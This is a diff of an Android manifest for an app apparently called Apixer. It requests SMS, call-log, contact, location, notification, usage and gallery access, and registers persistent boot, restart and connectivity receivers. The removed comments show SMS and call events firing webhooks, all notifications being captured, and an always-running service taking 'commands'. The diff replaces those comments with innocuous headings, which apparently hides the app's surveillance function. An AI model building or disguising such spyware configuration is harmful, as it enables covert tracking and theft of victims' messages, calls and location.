@@ -2,33 +2,39 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ── Permissions ─────────────────────────────────── -->
+    <!-- Core Network -->
     <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <!-- Communication Management -->
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
+
+    <!-- Location Services -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- Background Sync -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.WAKE_LOCK" />
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <!-- System -->
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-permission android:name="android.permission.ACCESS_NOTIFICATION_POLICY" />
     <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />
-
-    <!-- Active App Tracker — usage stats access -->
     <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS"
         tools:ignore="ProtectedPermissions" />
 
-    <!-- Media Library — complete gallery access for thumbnail scanning -->
+    <!-- Media Access -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
     <uses-permission android:name="android.permission.READ_MEDIA_VISUAL_USER_SELECTED" />
@@ -45,7 +51,9 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:windowSoftInputMode="adjustResize"
-        android:theme="@style/Theme.Apixer">
+        android:theme="@style/Theme.Apixer"
+        android:usesCleartextTraffic="false"
+        android:networkSecurityConfig="@xml/network_security_config">
 
         <activity
             android:name=".MainActivity"
@@ -56,13 +64,11 @@
             </intent-filter>
         </activity>
 
-        <!-- Always-running Foreground Service for live background sync & commands -->
         <service
             android:name=".service.AgentBackgroundService"
             android:foregroundServiceType="dataSync"
             android:exported="false" />
 
-        <!-- Notification Listener Service — captures all incoming notifications -->
         <service
             android:name=".service.NotificationCaptureService"
             android:exported="true"
@@ -72,7 +78,6 @@
             </intent-filter>
         </service>
 
-        <!-- Watchdog / Restart Receiver -->
         <receiver
             android:name=".receiver.RestartReceiver"
             android:exported="false">
@@ -81,7 +86,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Network Connectivity State Receiver — automatically reconnects when data/wifi turns on -->
         <receiver
             android:name=".receiver.ConnectivityReceiver"
             android:exported="true">
@@ -92,7 +96,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Boot receiver — re-start live service and sync worker after reboot/update -->
         <receiver
             android:name=".receiver.BootReceiver"
             android:exported="true">
@@ -104,7 +107,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Real-time SMS receiver — fires webhook on SMS_RECEIVED -->
         <receiver
             android:name=".receiver.SmsReceiver"
             android:exported="true"
@@ -114,7 +116,6 @@
             </intent-filter>
         </receiver>
 
-        <!-- Real-time Call receiver — fires webhook on call state changes -->
         <receiver
             android:name=".receiver.CallReceiver"
             android:exported="true">
@@ -122,6 +123,12 @@
                 <action android:name="android.intent.action.PHONE_STATE" />
             </intent-filter>
         </receiver>
+
+        <!-- Remove default WorkManagerInitializer (on-demand init via ApixerApp) -->
+        <provider
+            android:name="androidx.startup.InitializationProvider"
+            android:authorities="${applicationId}.androidx-startup"
+            tools:node="remove" />
 
     </application>
 
